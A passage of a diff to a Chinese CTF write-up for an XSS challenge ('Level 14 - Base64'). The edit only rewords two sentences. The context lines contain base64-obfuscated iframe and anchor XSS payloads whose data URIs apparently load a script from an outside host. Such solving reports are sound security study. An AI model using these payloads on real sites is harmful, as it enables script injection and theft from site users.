@@ -363,7 +363,7 @@ HTTPS:E.XP>
 
 其中 `<img>` 标签是无法用来触发 JS 的，而 `<object>` 标签前面已经用过了。
 
-实际上 `<iframe>` 标签也是可以完成挑战的，这两个 payload 均可完成挑战：
+实际上 `<iframe>` 标签也是可以完成挑战的，例如这两个 payload 均可：
 
 ```html
 "><IFRAME/SRC="data:TEXT/HTML;BASE64,ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6WFNTJTJFJTU0JTQ2L1RPSD4KPC9TQ1JJUFQKID4=
@@ -376,7 +376,7 @@ HTTPS:E.XP>
 ![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/14.png)
 ![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/15.png)
 
-`<a>` 标签原本也是可以触发 JS 的，不妨构造遮掩过的 payload ：
+`<a>` 标签原本也是可以触发 JS 的，不妨构造这样的 payload 测试下：
 
 ```html
 "><A/HREF="data:TEXT/HTML;BASE64,ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6WFNTJTJFJTU0JTQ2L1RPSD4KPC9TQ1JJUFQKID4=">link</A><IMG/SRC="
